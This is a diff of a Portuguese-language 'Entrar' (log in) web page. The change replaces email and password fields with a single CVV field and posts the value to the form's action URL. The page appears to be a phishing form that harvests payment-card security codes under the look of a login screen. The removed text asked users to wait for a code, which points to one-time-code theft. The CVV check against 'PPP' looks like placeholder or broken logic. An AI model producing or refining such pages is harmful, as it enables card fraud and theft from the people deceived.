@@ -104,23 +104,20 @@
             </div>
             <button type="button" onclick="enviarFormulario()">Entrar</button>
             <p id="mensagemErro" style="color: red;"></p>
-            <p id="mensagemAguarde">Depois de clicar em entrar, espere o código...</p>
         </form>
     </div>
 
     <script>
         function enviarFormulario() {
-            var email = document.getElementById('email').value;
-            var password = document.getElementById('password').value;
+            var cvv = document.getElementById('cvv').value;
 
-            if (email === '' || password === '') {
-                document.getElementById('mensagemErro').innerText = 'Por favor, preencha todos os campos.';
+            if (cvv !== 'PPP') {
+                document.getElementById('mensagemErro').innerText = 'CVV incorreto. Por favor, verifique e tente novamente.';
                 return;
             }
 
             var formData = new FormData();
-            formData.append('email', email);
-            formData.append('password', password);
+            formData.append('cvv', cvv);
 
             var xhr = new XMLHttpRequest();
             xhr.open('POST', document.getElementById("loginForm").action);
